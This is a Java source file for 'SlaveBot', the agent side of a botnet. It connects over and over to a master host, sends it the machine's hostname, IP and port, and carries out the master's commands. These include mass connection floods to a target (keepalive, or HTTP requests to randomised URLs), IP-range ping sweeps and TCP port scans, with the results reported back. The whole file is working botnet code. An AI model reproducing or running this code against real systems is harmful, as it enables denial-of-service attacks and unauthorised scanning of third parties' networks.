//package slavebot;

import java.io.*;
import java.util.*;
import java.lang.*;
import java.net.*;
import java.text.*;

/**
 *
 * @author pankaj
 */
public class SlaveBot {
    
    ArrayList<Socket> targetHostList=new ArrayList<>(); //Global ArrayList to maintain the list of targethosts.
    ArrayList<SlaveBotThread> threadList=new ArrayList<>();//Global ArrayList to maintain thread list.
    
    public static void main(String[] args){
      int count=0;
      while(1==1){
          count++;
          try{
                //Connect to Master by taking info from cmmnd line args and create input and output streams on the socket
                String hostName = args[1]; //master bot's ip address
                int portNumber = Integer.parseInt(args[3]); //master bots port number
                Socket slaveMasterSocket = new Socket(hostName, portNumber); //connects to master bot on the specified port number
                System.out.println("Connected to master");
                PrintWriter out2 = new PrintWriter(slaveMasterSocket.getOutputStream(), true);//output stream
                BufferedReader in = new BufferedReader(new InputStreamReader(slaveMasterSocket.getInputStream())); //inputstream
                //END
            
            
                //collects local info and send to master
                String localHostName = InetAddress.getLocalHost().getHostName();
                String localIP = InetAddress.getLocalHost().getHostAddress();
                int localPort= slaveMasterSocket.getLocalPort();
                Date dNow = new Date( );
                SimpleDateFormat ft = new SimpleDateFormat ("yyyy-MM-dd");
                String fromServer;
                String toServer;
                toServer=localHostName+"  "+localIP+"  "+localPort+"  "+ft.format(dNow); 
                out2.println(toServer); //sends slave info to master
                out2.println("over");
                //End
                
                //Listen input strings and call the correct method
                SlaveBot slaveBot=new SlaveBot();
       
                while ((fromServer = in.readLine()) != null ) {
                        System.out.println("Server: " + fromServer);
                        StringTokenizer st = new StringTokenizer(fromServer);
                        String buffer;
                        while (st.hasMoreTokens()) {
                            buffer=st.nextToken();
                            switch(buffer){
                                case "connect" : case "Connect" : case "CONNECT" : slaveBot.connect(fromServer); break;
                                case "disconnect" : case "Disconnect" : case "DISCONNECT" : slaveBot.disconnect(fromServer); break;
                                case "test" : out2.println("ack");break;
                                case "ipscan" : case "IPSCAN" : case "IPscan" :case "geoipscan": slaveBot.ipscan(fromServer,slaveMasterSocket); break;
                                case "tcpportscan" : case "TCPPORTSCAN" : slaveBot.portscan(fromServer, slaveMasterSocket);break;
                                default: break;
                            }
                        }
                }
                //END
                
            }catch(Exception e){if((count%10)==0)System.out.println("Master Not Available Retrying......");}
        }
    }
    
    //Method to execute connect command
    
    public void connect(String argument){ 
        String buffer;
        int i=0;
        String targetHostName="1.1.1.1";
        int port=0;
        int numberOfConnections=1;
        String path;
        //System.out.println("inside connect method");
        StringTokenizer st = new StringTokenizer(argument);
        //Breakdown connect string
        while (st.hasMoreTokens()) {
            i++;
            buffer=st.nextToken();
            //System.out.println(buffer);
            switch(i){
                case 3: try{numberOfConnections=Integer.parseInt(buffer);}catch(NumberFormatException e){targetHostName=buffer;}break;
                case 4: try{port=Integer.parseInt(buffer);}catch(NumberFormatException e){} break;
                case 5: try{numberOfConnections=Integer.parseInt(buffer);}catch(NumberFormatException e){numberOfConnections=1;}break;
                default : break;
             
            }
        } 
        //END
        
        //Create the number of connections as desired
        
        for(i=1;i<=numberOfConnections;i++){
            try{
               //Socket sock=new Socket(targetHostName,port);
                if(argument.contains("keepalive")){ 
                    SlaveBotThread sbt=new SlaveBotThread(targetHostName,port,"keepalive");
                    threadList.add(sbt);
                }
                
                else if(argument.contains("url=")){
                    String urlstring;
                    
                    if(argument.contains("http://")||argument.contains("https://"))
                        urlstring=argument.subSequence(argument.indexOf('=')+1, argument.length()).toString()+getRandomString();
                    else if(port==443)
                        urlstring="https://"+targetHostName+argument.subSequence(argument.indexOf('=')+1, argument.length()).toString()+getRandomString();
                    else
                        urlstring="http://"+targetHostName+argument.subSequence(argument.indexOf('=')+1, argument.length()).toString()+getRandomString();
                    
                    SlaveBotThread sbt=new SlaveBotThread(urlstring,targetHostName,port);
                    sbt.start();
                    threadList.add(sbt);
                }
                    
                else{
                    SlaveBotThread sbt=new SlaveBotThread(targetHostName,port);
                    threadList.add(sbt);
                }
                        
            }catch(Exception e){System.out.println(e);}
            
        }   
        //END
    }
    
    //Method to execute Disconnect command
    
    public void disconnect(String argument){ 
        String buffer;
        int i=0;
        String targetHostName="1.1.1.1";
        int port=0;
        StringTokenizer st = new StringTokenizer(argument);
        
        //BreakDown disconnect Command
        while (st.hasMoreTokens()) {
            i++;
            buffer=st.nextToken();
            switch(i){
                case 3: targetHostName=buffer; break;
                case 4: port=Integer.parseInt(buffer); break;
                default : break;
            }
        }
        //END
        
        //Disconnect according to numbber of connections specified
        try{ 
            if(port==0){
                int size=threadList.size();
                for(i=0;i<size;i++){
                    if(threadList.get(i).gethost().contains(targetHostName)){
                        threadList.get(i).disconnect();
                        threadList.remove(i);
                        i--;
                        size--;
                    } 
                }
            }
            
            else{
                 int count=0;
                 int size=threadList.size();
                 for(i=0;i<size;i++){
                    if(threadList.get(i).gethost().contains(targetHostName) && threadList.get(i).getport()==port){
                        threadList.get(i).disconnect();
                        threadList.remove(i);
                        i--;
                        size--; 
                        count++;
                        if(count==port)
                        break;
                    }
                }
            }
        }catch(Exception e){System.out.println(e);}
    }
    
    //pinging service
    
    public void ipscan(String argument,Socket socket) {
        new Thread(() -> {
        String buffer;
        int i=0;
        String targetRange="1.1.1.1";
        StringTokenizer st = new StringTokenizer(argument);
        
        //BreakDown disconnect Command
        while (st.hasMoreTokens()) {
            i++;
            buffer=st.nextToken();
            switch(i){
                case 3: targetRange=buffer; break;
                default : break;
            }
        }
        String temp[]=targetRange.split("-");
        IPAddress ip1=new IPAddress(temp[0]);
        IPAddress ip2=new IPAddress(temp[1]);
        String all="";
        //Process p;
        do{
            try{
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                InetAddress inet = InetAddress.getByName(ip1.toString());
                Process p = Runtime.getRuntime().exec("ping -c 1 -t 5 " + ip1.toString());//for unix like
                //Process p = Runtime.getRuntime().exec("ping -n 1 -w 5 " + ip1.toString());//for windows
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                int flag=0;
                String line = "";
                while ((line = reader.readLine())!= null) {
                if(line.contains("ttl")||line.contains("TTL"))
                    flag=1;
                }
                p.waitFor();
                //if(inet.isReachable(5000))
                if(flag==1)
                {
                    
                    if(all.equals(""))
                        all=ip1.toString();
                    else
                        all=all+", "+ip1.toString();
                }
                
            }catch(Exception e){}
            ip1=ip1.next();
        }while(ip1.getValue()<=ip2.getValue());
        try{
           PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
           out.println(all);
        }catch(Exception e){}
        try{
            PrintWriter out=new PrintWriter(socket.getOutputStream(), true);
            out.println("over2"); 
        }catch(Exception e){System.out.println(e);}    
        }).start();
    }
    
    //portscan service
    
    public void portscan(String argument,Socket socket) {
       new Thread(() -> {
        String buffer;
        int i=0;
        String targetHost="";
        String portRange="";
        int portStart,portEnd;
        StringTokenizer st = new StringTokenizer(argument);
        
        //BreakDown Command
        while (st.hasMoreTokens()) {
            i++;
            buffer=st.nextToken();
            switch(i){
                case 3: targetHost=buffer; break;
                case 4: portRange=buffer;
                default : break;
            }
        }
        String temp[]=portRange.split("-");
        portStart=Integer.parseInt(temp[0]);
        portEnd=Integer.parseInt(temp[1]);
        PrintWriter out;
        String all="";
        for(i=portStart;i<=portEnd;i++){
            try{
                Socket so = new Socket(targetHost,i);
                out = new PrintWriter(socket.getOutputStream(), true);
                if(all.equals(""))
                    all=all+i;
                else    
                    all=all+", "+i;
                so.close();
            }catch(Exception e){}
        }
        
        try{
           out = new PrintWriter(socket.getOutputStream(), true);
           out.println(all);
        }catch(Exception e){}
        
        try{
        out=new PrintWriter(socket.getOutputStream(), true);
        out.println("over2"); 
        }catch(Exception e){}   
       }).start();
    }
    
    //method to get random string
    public String getRandomString() {
        String RANDCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqstuvwxyz1234567890";
        StringBuilder random = new StringBuilder();
        Random rnd = new Random();
        int len = rnd.nextInt(10) + 1;
        while (random.length() < len+1) {
            int index = (int) (rnd.nextFloat() * RANDCHARS.length());
            random.append(RANDCHARS.charAt(index));
        }
        String saltStr = random.toString();
        return saltStr;

    }
}

//class to iterate through the ip range
class IPAddress {

    private final int value;

    public IPAddress(int value) {
        this.value = value;
    }

    public IPAddress(String stringValue) {
        String[] parts = stringValue.split("\\.");
        if( parts.length != 4 ) {
            throw new IllegalArgumentException();
        }
        value = 
                (Integer.parseInt(parts[0], 10) << (8*3)) & 0xFF000000 | 
                (Integer.parseInt(parts[1], 10) << (8*2)) & 0x00FF0000 |
                (Integer.parseInt(parts[2], 10) << (8*1)) & 0x0000FF00 |
                (Integer.parseInt(parts[3], 10) << (8*0)) & 0x000000FF;
    }

    public int getOctet(int i) {

        if( i<0 || i>=4 ) throw new IndexOutOfBoundsException();

        return (value >> (i*8)) & 0x000000FF;
    }

    public String toString() {
        StringBuilder sb = new StringBuilder();

        for(int i=3; i>=0; --i) {
            sb.append(getOctet(i));
            if( i!= 0) sb.append(".");
        }

        return sb.toString();

    }

    @Override
    public boolean equals(Object obj) {
        if( obj instanceof IPAddress ) {
            return value==((IPAddress)obj).value;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return value;
    }

    public int getValue() {
        return value;
    }

    public IPAddress next() {
        return new IPAddress(value+1);
    }
}